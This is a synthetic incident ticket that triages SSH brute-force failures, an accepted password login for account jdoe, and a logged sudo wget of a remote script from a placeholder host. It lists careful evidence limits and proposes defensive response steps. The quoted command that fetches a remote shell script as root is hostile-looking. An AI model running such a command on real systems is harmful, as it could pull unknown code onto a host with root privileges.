# Incident ticket

**Title:** Suspicious SSH password login followed by a root-context wget command

**Status:** Open for triage; synthetic exercise. Authorization and compromise unconfirmed.

**Affected scope:** Account jdoe; host unspecified. Source 185.220.101.4; command URL http://203.0.113.50/x.sh. mlee is a separate unverified event, not an established affected account or linked activity.

**Severity:** Provisional high triage priority: three failures are followed by accepted jdoe password authentication from the same source and a sudo command targeting root context. If unauthorized, this warrants urgent review because privileged activity could materially affect the host. Actual impact is unknown.

**Root-context command:** jdoe : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.50/x.sh

**Evidence limits:** No proof the download succeeded, the script executed, the file was malware, the host or account was compromised, or any attribution or lateral movement occurred. No persistence or data theft is demonstrated. Host and timezone are unspecified; no session identifier proves L4 and L5 belong to one session. The mlee event is neither confirmed benign nor malicious.

## Timeline

| Timestamp (timezone unspecified) | Evidence / observation |
| --- | --- |
| 2026-10-26 02:13:44 | L1: sshd[2211]: Failed password for root from 185.220.101.4 port 51122 |
| 2026-10-26 02:13:46 | L2: sshd[2211]: Failed password for root from 185.220.101.4 port 51130 |
| 2026-10-26 02:13:49 | L3: sshd[2214]: Failed password for admin from 185.220.101.4 port 51144 |
| 2026-10-26 02:14:02 | L4: sshd[2219]: Accepted password for jdoe from 185.220.101.4 port 51190 |
| 2026-10-26 02:14:40 | L5: sudo: jdoe : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.50/x.sh |
| 2026-10-26 09:02:11 | L6: sshd[3301]: Accepted publickey for mlee from 10.0.4.22 port 40022 |

## First three response actions (ordered proposals)

1. Preserve available authentication, sudo, process, network and file evidence; identify the host and timezone and correlate surrounding records.
2. Verify jdoe’s login and command with the account owner and approved activity records; separately validate mlee’s source and key.
3. Determine wget outcome and inspect any existing destination file, hash, contents, ownership and subsequent process activity without executing it; review other sessions and privilege changes.

No response action has been performed. No supplied IP or URL was contacted or retrieved during this exercise.
